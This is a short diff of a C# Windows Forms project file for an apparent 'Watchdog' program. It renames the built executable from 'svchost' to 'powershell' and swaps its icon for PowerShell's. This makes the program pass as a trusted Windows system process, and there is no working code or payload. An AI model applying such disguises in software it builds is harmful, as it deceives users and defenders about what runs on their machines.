@@ -6,15 +6,14 @@
     <Nullable>enable</Nullable>
     <UseWindowsForms>true</UseWindowsForms>
     <ImplicitUsings>enable</ImplicitUsings>
-    <AssemblyName>svchost</AssemblyName>
-    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <AssemblyName>powershell</AssemblyName>
     <StartupObject>Watchdog.Program</StartupObject>
-    <ApplicationIcon>safe-surf.ico</ApplicationIcon>
 	<GenerateAssemblyInfo>false</GenerateAssemblyInfo>
+	<ApplicationManifest>app.manifest</ApplicationManifest>
+	<ApplicationIcon>PowerShell_5.0_icon.ico</ApplicationIcon>
   </PropertyGroup>
 
   <ItemGroup>
-    <Content Include="safe-surf.ico" />
+    <Content Include="PowerShell_5.0_icon.ico" />
   </ItemGroup>
-
 </Project>
